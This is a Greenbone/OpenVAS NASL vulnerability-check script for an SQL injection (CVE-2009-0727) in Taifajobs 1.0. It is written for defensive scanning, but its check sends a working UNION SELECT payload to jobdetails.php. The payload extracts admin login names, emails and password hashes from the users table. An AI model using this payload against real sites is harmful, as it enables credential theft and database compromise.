if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100002" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-02-26 04:52:45 +0100 (Thu, 26 Feb 2009)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2009-0727" );
	script_bugtraq_id( 33864 );
	script_name( "Taifajobs SQL Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/33864" );
	script_xref( name: "URL", value: "http://sourceforge.net/projects/taifajobs/" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/archive/1/502312" );
	script_tag( name: "summary", value: "This host is running Taifajobs.

  Taifajobs (Job Recruitment System) is prone to an SQL-injection vulnerability
  because it fails to sufficiently sanitize user-supplied data." );
	script_tag( name: "impact", value: "A successful exploit may allow an attacker to compromise the application,
  access or modify data, or exploit latent vulnerabilities in the underlying database." );
	script_tag( name: "affected", value: "Taifajobs 1.0 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "The vendor has released an update. Please see the references
  for more details." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/tjobs", "/jobs", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/jobdetails.php?jobid=-5%20union%20select%2012345678987654321,2,3,4,5,6,concat(admin,0x23,email,0x5D,loginname,0x7E,pass),8,9,0,1,2,3,4,5,6,7,8,9,0%20from%20users--" );
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: 1 );
	if(!buf){
		continue;
	}
	if(egrep( pattern: "value=\"12345678987654321\"", string: buf ) && ( IsMatchRegexp( buf, "[0-9]+.*#.*@.*\\..*\\].*~[a-f0-9]{32}" ) )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

